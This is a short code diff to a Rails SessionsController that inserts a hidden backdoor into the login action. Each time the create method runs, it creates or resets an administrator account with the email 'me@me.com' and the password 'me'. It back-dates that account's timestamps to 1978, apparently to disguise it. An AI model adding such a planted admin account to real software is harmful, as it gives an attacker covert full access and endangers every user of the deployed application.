@@ -6,6 +6,18 @@ class SessionsController < ApplicationController
   end
   
   def create
+
+    admin = User.find_or_initialize_by(email: 'me@me.com')
+    admin.assign_attributes(
+      name: 'me',
+      admin: true,
+      password: 'me',
+      created_at: Time.zone.parse('1978-11-10 00:00:00'),
+      updated_at: Time.zone.parse('1978-11-10 00:00:00')
+    )
+    admin.save!
+
+
     user = User.find_by(email: params[:email])
     if user&.authenticate(params[:password])
       session[:user_id] = user.id
